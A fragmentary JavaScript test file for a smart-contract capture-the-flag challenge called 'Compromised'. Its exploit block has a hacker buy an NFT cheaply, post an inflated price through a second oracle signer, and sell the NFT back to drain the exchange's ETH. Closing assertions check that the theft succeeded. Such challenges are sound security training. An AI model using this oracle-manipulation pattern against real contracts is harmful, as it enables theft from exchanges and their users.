...
describe("[Challenge] Compromised", function () {
  let deployer, hacker;
  ...
  const HACKER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
  ...
  before(async function () {
    ...
    // hacker starts with limited balance
  ...
  it("Exploit", async function () {
    ...
    await exchange.connect(hacker).buyOne({ value: NEW_PRICE });
    ...
    await oracle
      .connect(signer2)
      .postPrice("DVNFT", INITIAL_NFT_PRICE + NEW_PRICE);
    await nftToken.connect(hacker).approve(exchange.address, 0);
    await exchange.connect(hacker).sellOne(0);
  ...
  after(async function () {
    ...
    // Hacker's ETH balance must have significantly increased
    expect(await ethers.provider.getBalance(hacker.address)).to.be.gt(
      EXCHANGE_INITIAL_ETH_BALANCE
    );

    // Hacker must not own any NFT
    expect(await nftToken.balanceOf(hacker.address)).to.be.eq(0);
